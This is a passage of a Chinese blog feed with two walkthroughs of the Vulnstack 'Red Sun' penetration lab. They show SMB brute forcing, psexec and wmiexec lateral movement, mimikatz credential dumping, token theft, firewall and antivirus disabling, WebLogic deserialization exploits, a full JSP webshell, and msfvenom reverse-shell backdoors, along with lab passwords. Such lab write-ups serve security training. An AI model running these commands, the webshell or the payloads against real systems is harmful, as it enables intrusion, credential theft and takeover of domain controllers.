rhosts 192.168.93.0-255</span><br><span class="line">set threads 10</span><br><span class="line">run</span><br><span class="line">#扫到了三台机器</span><br><span class="line">192.168.93.30/24 win7</span><br><span class="line">192.168.93.20/24 win2008</span><br><span class="line">192.168.93.10/24 win-8GA56TNV3MV</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97-20231130152159-mtudj1h.png" alt="主机扫描模块">​<img src="/assets/%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F-20231130152202-zeo3nof.png" alt="内网主机扫描">​​</p><h3 id="nmap探测三台主机端口"><a href="#nmap探测三台主机端口" class="headerlink" title="nmap探测三台主机端口"></a>nmap探测三台主机端口</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychain nmap -F -sT -v 192.168.93.10</span><br><span class="line">proxychain nmap -F -sT -v 192.168.93.20</span><br><span class="line">proxychain nmap -F -sT -v 192.168.93.30</span><br><span class="line">#10开启389端口 --&gt;可能是域控</span><br><span class="line">#都开启了445端口，尝试爆破管理员账密</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%8C%82%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F10%E7%AB%AF%E5%8F%A3-20231130152524-sl9gjgx.png" alt="挂代理扫描10端口">​<img src="/assets/%E6%8C%82%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F20%E7%AB%AF%E5%8F%A3-20231130152529-ukvxwhi.png" alt="挂代理扫描20端口">​<img src="/assets/%E6%8C%82%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F30%E7%AB%AF%E5%8F%A3-20231130152532-auqekmr.png" alt="挂代理扫描30端口">​​​</p><h3 id="尝试爆破三台主机管理员账密"><a href="#尝试爆破三台主机管理员账密" class="headerlink" title="尝试爆破三台主机管理员账密"></a>尝试爆破三台主机管理员账密</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#字典需要足够大</span><br><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set SMBuser Administrator</span><br><span class="line">set PASS_FILE /home/kali/Desktop/top999.txt</span><br><span class="line">run</span><br><span class="line">--&gt;192.168.93.20 smb  123qwe!ASD</span><br><span class="line">--&gt;192.168.93.30 smb  123qwe!ASD</span><br><span class="line">#已经拿到了两台win的密码，</span><br><span class="line">#10这台机器出不了，可能就是域控</span><br></pre></td></tr></table></figure><p>​<img src="/assets/SMB-20%E5%87%BA%E4%BA%86-20231130160123-9rrsciy.png" alt="SMB-20出了">​<img src="/assets/SMB-30%E5%87%BA%E4%BA%86-20231130160126-v0ftudn.png" alt="SMB-30出了">​​</p><h2 id="四，横向渗透"><a href="#四，横向渗透" class="headerlink" title="四，横向渗透"></a>四，横向渗透</h2><h3 id="psexec攻击"><a href="#psexec攻击" class="headerlink" title="psexec攻击"></a>psexec攻击</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#利用psexec工具进行攻击192.168.93.30/20主机</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set SMBPass 123qwe!ASD</span><br><span class="line">set RHOSTS 192.168.93.30</span><br><span class="line">run</span><br><span class="line">---&gt;20/30机器攻击成功</span><br></pre></td></tr></table></figure><p>攻击20这台机器</p><p><img src="/assets/%E4%B9%9F%E6%8B%BF%E4%B8%8Bwin2k8--20-20231130160231-c0kdpmm.png" alt="也拿下win2k8--20">​</p><p>攻击30这台机器</p><p><img src="/assets/psexec%E6%94%BB%E5%87%BB%E6%8B%BF%E4%B8%8Bwin7--30-20231130160234-7h204tf.png" alt="psexec攻击拿下win7--30">​​</p><h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=SRV _ldap._tcp</span><br><span class="line">#域控明显是10这台机器，和之前猜测的一样</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7-20231130160334-crjeci8.png" alt="定位域控">​</p><h3 id="minikatz"><a href="#minikatz" class="headerlink" title="minikatz"></a>minikatz</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#利用MSF的kiwi模块</span><br><span class="line">load kiwi</span><br><span class="line">#列出所有凭据</span><br><span class="line">creds_all</span><br><span class="line">#使用kiwi抓取明文密码：</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br><span class="line">#win7</span><br></pre></td></tr></table></figure><p>可以看出win7这台机器上，信息极少，无用</p><p>​<img src="/assets/win7%E5%8A%A0%E8%BD%BDkiwi-20231130160518-yzvvva7.png" alt="win7加载kiwi">​</p><p>试试win2k8这台机器</p><p>​<img src="/assets/win2k8--%E6%8A%93%E5%8F%96%E7%A5%A8%E6%8D%AE-20231130160603-u2o5y91.png" alt="win2k8--抓取票据">​</p><p>成功拿到域控账密</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">---&gt;拿到密码：zxcASDqw123!!</span><br></pre></td></tr></table></figure><h3 id="尝试psexec攻击域控"><a href="#尝试psexec攻击域控" class="headerlink" title="尝试psexec攻击域控"></a>尝试psexec攻击域控</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set SMBPass zxcASDqw123!!</span><br><span class="line">set RHOSTS  192.168.93.10</span><br><span class="line">run</span><br><span class="line">#攻击失败，可能是防火墙的原因</span><br><span class="line">#换个姿势继续</span><br><span class="line">#其它两台主机已经拿下,在win2k8上窃取管理员用户的token令牌</span><br><span class="line">#这样就可以通过win2008 访问域控，然后远程关掉域控的防火墙,psexec攻击继续</span><br></pre></td></tr></table></figure><p>​<img src="/assets/psexec%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7%E5%A4%B1%E8%B4%A5--%E9%98%B2%E7%81%AB%E5%A2%99-20231130160733-332um0t.png" alt="psexec攻击域控失败--防火墙">​</p><h3 id="窃取域控token令牌"><a href="#窃取域控token令牌" class="headerlink" title="窃取域控token令牌"></a>窃取域控token令牌</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#先利用MSF生成一个正向的木马</span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.43.33 LPORT=10244 -f exe -o 244.exe</span><br><span class="line">#上传244.exe</span><br><span class="line">upload 244.exe</span><br><span class="line">#运行244.exe</span><br><span class="line">244.exe</span><br><span class="line">#返回msf的shell</span><br><span class="line">exit</span><br><span class="line">#窃取token</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;TEST\Adminitrator&quot;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E7%AA%83%E5%8F%96token%E6%88%90%E5%8A%9F-20231130161531-ztx02vu.png" alt="窃取token成功">​</p><p>试试win7这台机器能否成功</p><p>​<img src="/assets/win7%E4%B8%8D%E8%83%BD%E7%AA%83%E5%8F%96token-20231130161620-48f1g4p.png" alt="win7不能窃取token">​</p><p>显然失败了，因为不存在</p><h3 id="关闭域控防火墙"><a href="#关闭域控防火墙" class="headerlink" title="关闭域控防火墙"></a>关闭域控防火墙</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.93.10 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\192.168.93.10 start unablefirewall</span><br><span class="line">#响应超时，执行失败</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Sc%E5%A4%B1%E8%B4%A5-20231130161712-89q19oa.png" alt="Sc失败">​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#简直有毒</span><br><span class="line">#登上去一看，他喵的这不是关了吗？</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-11-30 162317](assets&#x2F;屏幕截图 2023-11-30 162317-20231130162404-wghe5oq.png)​</p><h3 id="psexec继续攻击域控"><a href="#psexec继续攻击域控" class="headerlink" title="psexec继续攻击域控"></a>psexec继续攻击域控</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#显然失败了，可能是防火墙的原因（鬼知道什么原因）也可能是会话连接不稳定</span><br></pre></td></tr></table></figure><p>​<img src="/assets/psexec%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7%E5%A4%B1%E8%B4%A5--%E9%98%B2%E7%81%AB%E5%A2%99-20231130160733-332um0t.png" alt="psexec攻击域控失败--防火墙">​</p><h3 id="利用wmiexec"><a href="#利用wmiexec" class="headerlink" title="利用wmiexec"></a>利用wmiexec</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#kali中安装wmiexec</span><br><span class="line">https://github.com/coresecurity/impacket/blob/masterexamples/wmiexec.py</span><br><span class="line">#需要先下载impacket工具包，这里面有很多工具</span><br><span class="line">git clone https://github.com/CoreSecurity/impacket.git</span><br><span class="line">cd impacket/</span><br><span class="line">pip install .</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd ./examples</span><br><span class="line">#安装成功后，切换到examples目录下，</span><br><span class="line">#运行如下命令获取目标系统192.168.93.10(域控)的shell</span><br><span class="line">proxychains python3 wmiexec.py &#x27;administrator:zxcASDqw123!!@192.168.93.10&#x27;</span><br><span class="line"></span><br><span class="line">#也可以拿到其它机器的shell</span><br><span class="line">proxychains python3 wmiexec.py &#x27;administrator:123qwe!ASD@192.168.93.20&#x27;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7-20231130162741-bp97g4z.png" alt="拿下域控">​</p><p>192.168.93.20</p><p><img src="/assets/wmiexec%E6%8B%BF%E4%B8%8B20-20231130162744-ksoydg9.png" alt="wmiexec拿下20">​​</p><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#最终在C:\Users\Adminisreator\Documents\目录下找到flag.txt</span><br><span class="line">dir</span><br><span class="line">type flag.txt</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%8B%BF%E4%B8%8Bflag-20231130162830-docw3la.png" alt="拿下flag">​</p><h3 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h3><p>​<img src="/assets/sessions-20231130162905-zkjdypj.png" alt="sessions">​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 红日靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 测试 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 红日靶场 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATK—CK红队评估实战靶场二</title>
      <link href="/2024/04/11/hrbc/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA02/"/>
      <url>/2024/04/11/hrbc/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA02/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="红日靶场02"><a href="#红日靶场02" class="headerlink" title="红日靶场02"></a>红日靶场02</h1><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><ul><li>红日靶场：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></li><li>靶机通用密码：1qaz@WSX</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">192.168.43.201 PC</span><br><span class="line">10.10.10.201   PC</span><br><span class="line">192.168.43.80  WEB</span><br><span class="line">10.10.10.80    WEB</span><br><span class="line">192.168.43.33  kali+CS+MSF</span><br><span class="line">cs客户端  本机win11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.为三台虚拟机添加网卡</span><br><span class="line">DC在该环境中充当是域控。</span><br><span class="line">三台虚拟机添加VMnet2网卡</span><br><span class="line"></span><br><span class="line">2.登录PC服务器，WEB服务器</span><br><span class="line">#web服务器ip地址修改为192.168.43.80</span><br><span class="line">#pc服务器ip地址修改为192.168.43.201</span><br><span class="line"></span><br><span class="line">3.启动weblogic</span><br><span class="line">我们在web中，打开</span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径</span><br><span class="line">使用管理员才能进去administrator/1qaz@WSX</span><br><span class="line">以管理员权限执行setDomainENV、startManageWeblogic、startWeblogic  </span><br><span class="line">环境配置到此结束</span><br></pre></td></tr></table></figure><p>​<img src="/assets/PC%E6%9C%8D%E5%8A%A1%E5%99%A8-20231118181258-gy1d5dq.png" alt="PC服务器">​![WEB (2)](assets&#x2F;WEB 2-20231118181258-bowpele.png)​​</p><p>​<img src="/assets/WEB-20231118181258-5mnk31e.png" alt="WEB">​![屏幕截图 2023-11-13 130910](assets&#x2F;屏幕截图 2023-11-13 130910-20231118181921-kcvumba.png)​<img src="/assets/%E4%B8%89%E4%B8%AA%E8%84%9A%E6%9C%AC-20231118181555-xkrj1g6.png" alt="三个脚本">​​​​​</p><h2 id="二、外网渗透"><a href="#二、外网渗透" class="headerlink" title="二、外网渗透"></a>二、外网渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.43.0/24</span><br><span class="line">nmap -A -sV -v -O -T4 -sS 192.168.43.80</span><br><span class="line"></span><br><span class="line">#发现开启了80，1433，3389，7001</span><br><span class="line">#web访问一波</span><br></pre></td></tr></table></figure><p>​<img src="/assets/3389+7001-20231118182922-tgstpwk.png" alt="3389+7001">​</p><p>​<img src="/assets/80+1433-20231118182922-lcl2ig0.png" alt="80+1433"></p><h3 id="WEB界面"><a href="#WEB界面" class="headerlink" title="WEB界面"></a>WEB界面</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#发现80端口为空白页面</span><br><span class="line">#7001端口报错，cms为Weblogic</span><br></pre></td></tr></table></figure><p>​<img src="/assets/80%E7%AB%AF%E5%8F%A3-20231118183058-85x10x8.png" alt="80端口">​<img src="/assets/7001%E7%AB%AF%E5%8F%A3-20231118183107-buai4q2.png" alt="7001端口">​​</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.80</span><br><span class="line">#目录爆破也毫无结果</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4-20231118183220-o8pvmk8.png" alt="目录爆破">​</p><h3 id="WeblogicScan工具"><a href="#WeblogicScan工具" class="headerlink" title="WeblogicScan工具"></a>WeblogicScan工具</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">因为是weblogic的站，直接上工具</span><br><span class="line"></span><br><span class="line">kali安装：</span><br><span class="line">git clone https://github.com/rabbitmask/WeblogicScan</span><br><span class="line">启动：</span><br><span class="line">python3 ./WeblogicScan.py -u 192.168.43.80 -p 7001</span><br><span class="line">结果：</span><br><span class="line">存在几个CVE</span><br></pre></td></tr></table></figure><p>​<img src="/assets/weblogicScan%E7%BB%93%E6%9E%9C-20231118183403-hnar7qk.png" alt="weblogicScan结果">​</p><h3 id="CVE利用"><a href="#CVE利用" class="headerlink" title="CVE利用"></a>CVE利用</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#百度一波CVE-2019-2725 CVE-2019-2729</span><br><span class="line">#两个CVE均存在</span><br><span class="line">CVE-2019-2729-Exp工具：</span><br><span class="line">git clone https://github.com/ruthlezs/CVE-2019-2729-Exploit</span><br><span class="line">python oracle-weblogic-deserialize.py -u http://192.168.43.80:7001 -c whoami</span><br></pre></td></tr></table></figure><p>​<img src="/assets/CVE-2019-2725-20231118183532-zh7o3ek.png" alt="CVE-2019-2725">​<img src="/assets/CVE-2019-2729-20231118183535-kz4as70.png" alt="CVE-2019-2729">​​</p><p>​<img src="/assets/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2729--whoami-20231118183627-s70jbas.png" alt="命令执行2729--whoami">​</p><h3 id="MSF利用CVE-2019-2725"><a href="#MSF利用CVE-2019-2725" class="headerlink" title="MSF利用CVE-2019-2725"></a>MSF利用CVE-2019-2725</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search cve-2019-2725</span><br><span class="line">use 0</span><br><span class="line">set payload</span><br><span class="line">set target 1   ----windows机器</span><br><span class="line">利用失败   #环境有问题，别的博主都成功了，我们换个思路</span><br></pre></td></tr></table></figure><p>​<img src="/assets/MSF+CVE-2725-20231118183757-scp265d.png" alt="MSF+CVE-2725">​</p><p>​<img src="/assets/2725%E5%A4%B1%E8%B4%A5-20231118183751-3pca5em.png" alt="2725失败"></p><h3 id="MSF利用永恒之蓝"><a href="#MSF利用永恒之蓝" class="headerlink" title="MSF利用永恒之蓝"></a>MSF利用永恒之蓝</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use windows/smb/ms17_010_eternablue</span><br><span class="line">set rhost 192.168.43.80</span><br><span class="line">set lhost 192.168.43.33</span><br><span class="line">run</span><br><span class="line">#发现被360拦截，换个思路继续</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%88%A9%E7%94%A8BLUE-20231118184507-25mh021.png" alt="利用BLUE">​</p><p>​<img src="/assets/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E8%A2%AB%E6%8B%A6%E6%88%AA-20231118184507-x0qs4ii.png" alt="永恒之蓝被拦截">​</p><h3 id="上传小马"><a href="#上传小马" class="headerlink" title="上传小马"></a>上传小马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#利用工具上传小马</span><br><span class="line">java -jar Java反序列化漏洞利用工具V1.7.jar</span><br><span class="line">#获取当前路径</span><br><span class="line">echo %cd%</span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain</span><br><span class="line">#上传jsp木马</span><br><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(&quot;passwd&quot;);</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">#密码为psswd</span><br></pre></td></tr></table></figure><p>​<img src="/assets/java%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%AD%98%E5%9C%A82725-20231118185322-2vh339c.png" alt="java利用工具存在2725"></p><h3 id="蚁剑连接木马"><a href="#蚁剑连接木马" class="headerlink" title="蚁剑连接木马"></a>蚁剑连接木马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#打开蚁剑连接小马</span><br><span class="line">#蚁剑虚拟终端</span><br><span class="line">#发现我们已经是administrator用户</span><br><span class="line">#关闭win防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off </span><br><span class="line">#查看防火墙配置状态</span><br><span class="line">netsh advfirewall show allprofile state </span><br><span class="line">#虽然是乱码，但我们仍可以看出防火墙已关闭</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5jsp%E6%9C%A8%E9%A9%AC-20231118185348-aq7ymjk.png" alt="蚁剑连接jsp木马"><br>​<img src="/assets/%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99-20231118185508-h6vofxz.png" alt="关闭防火墙">![关闭防火墙 (2)](assets&#x2F;关闭防火墙 2-20231118185514-2s649am.png)![关闭防火墙 (3)](assets&#x2F;关闭防火墙 3-20231118185518-y6tqdo4.png)​</p><h3 id="蚁剑上传大马"><a href="#蚁剑上传大马" class="headerlink" title="蚁剑上传大马"></a>蚁剑上传大马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#创建后门程序</span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.43.33 LPORT=10888 -f exe -o 233.exe </span><br><span class="line">#开启监听，设置sessions</span><br><span class="line">use exp/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp </span><br><span class="line">set lhost 33</span><br><span class="line">set lport 10888</span><br><span class="line">run</span><br><span class="line">#蚁剑上传</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC-20231118185834-4d57as9.png" alt="蚁剑上传木马"></p><h3 id="MSF监听大马"><a href="#MSF监听大马" class="headerlink" title="MSF监听大马"></a>MSF监听大马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">#发现我们只拿到了几十秒的shell，就被杀了</span><br><span class="line">#由于博主无计可施，再加上靶场环境总有些问题</span><br><span class="line">#博主尝试最后一种方法：进程迁移提权</span><br></pre></td></tr></table></figure><p>​<img src="/assets/MSF+233%E8%A2%AB%E6%9D%80%E4%BA%86-20231118190007-ti74ygu.png" alt="MSF+233被杀了">​<img src="/assets/360%E6%9D%80%E4%BA%86233Exe-20231118190012-7784vg2.png" alt="360杀了233Exe">​​</p><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#进程迁移到system权限进程services</span><br><span class="line">#services.exe是微软windows操作系统的一部分。</span><br><span class="line">#用于管理启动和停止服务</span><br><span class="line">#查看进程</span><br><span class="line">ps</span><br><span class="line">---     496   392   services.exe</span><br><span class="line">---     x64   0     NT AUTHORITY\SYSTEM       </span><br><span class="line">---     C:\Windows\system32\services.exe</span><br><span class="line">#进行进程迁移</span><br><span class="line">migrate 496</span><br><span class="line">run killav   关闭杀软   ---没有用</span><br><span class="line">#查看360的进程</span><br><span class="line">taskkill /f /PID 272   ---没用</span><br><span class="line"></span><br><span class="line">#得到系统权限，并且用不失联</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB1-20231118190322-r8k6hge.png" alt="进程迁移1">​</p><p>​<img src="/assets/%E8%BF%9B%E7%A8%8B%E6%8F%90%E6%9D%832-20231118190424-qwzsd46.png" alt="进程提权2">​</p><h2 id="三、内网渗透"><a href="#三、内网渗透" class="headerlink" title="三、内网渗透"></a>三、内网渗透</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 